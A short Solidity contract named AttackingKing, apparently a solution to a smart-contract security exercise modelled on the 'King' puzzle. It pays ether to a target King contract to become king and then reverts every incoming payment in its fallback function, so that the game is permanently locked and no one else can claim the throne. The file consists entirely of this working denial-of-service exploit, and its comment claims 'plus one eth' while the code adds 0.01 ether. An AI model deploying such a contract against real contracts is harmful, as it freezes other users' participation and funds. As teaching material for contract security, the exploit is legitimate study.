// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // Code me! send current king value plus one eth to become new king
        address(contractAddress).call{value: (address(contractAddress).balance + .01 ether)}("");
    }

    // any tx that tries to pay this attacking king contract will fail, so the person can't take over as king
    fallback() external payable {
        revert();
    }
}
